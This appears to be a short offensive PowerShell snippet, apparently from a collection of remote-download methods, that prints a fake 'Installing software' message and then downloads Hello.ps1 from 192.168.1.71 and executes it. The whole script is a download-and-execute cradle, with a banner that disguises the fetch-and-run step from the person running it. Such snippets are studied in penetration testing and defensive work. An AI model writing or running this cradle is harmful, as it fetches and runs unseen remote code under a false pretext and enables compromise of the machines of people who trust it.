#
# [ Invoke-WebRequest - Additional Methods for Remote Download ]
#
Write-Host "Please wait, Installing software .." -ForeGroundColor green -BackGroundColor black
Invoke-WebRequest "http://192.168.1.71/Hello.ps1" -OutFile "Hello.ps1" -PassThru
powershell.exe -File Hello.ps1
